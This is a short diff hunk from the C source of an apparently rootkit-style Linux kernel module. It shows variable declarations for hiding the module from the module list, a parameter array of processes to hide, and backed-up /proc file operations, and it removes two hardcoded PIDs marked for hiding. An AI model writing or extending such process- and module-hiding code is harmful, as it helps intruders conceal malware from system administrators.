@@ -330,11 +330,9 @@ struct list_head *module_list;//reference to module_list. Used to hide mod from 
 int count;
 static char* rkps[10];
 module_param_array(rkps, charp, &count, 0);
-static char *proc_to_hide = "1";
-static char *proc_to_hide1 = "3538";
 static struct file_operations proc_fops;//pointers to listing contents in proc dir
 static struct file_operations *backup_proc_fops;//keep backup in order to restore orginal struct 
-static struct inode *proc_inode;
+static struct inode *proc_inode;//node in proc
 static struct path p;
 struct dir_context *backup_ctx;
  
